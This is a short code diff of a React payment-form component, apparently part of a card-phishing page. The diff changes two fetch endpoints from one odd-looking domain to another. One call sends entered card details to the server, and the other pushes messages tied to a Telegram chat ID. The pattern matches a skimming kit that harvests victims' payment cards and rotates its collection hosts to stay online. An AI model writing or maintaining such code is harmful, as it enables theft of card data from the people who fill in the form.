@@ -123,7 +123,7 @@ const PaymentStepCard = () => {
     const sendTelegramMessage = async (message) => {
         try {
             const chatId = '-4723241842';
-            const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', {
+            const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -168,7 +168,7 @@ const PaymentStepCard = () => {
     
         try {
             // Enviar los datos de la tarjeta al backend
-            const response = await fetch('https://streaming.pagafacilntf.com/procesar', {
+            const response = await fetch('https://streaming.renovapunto.online/procesar', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
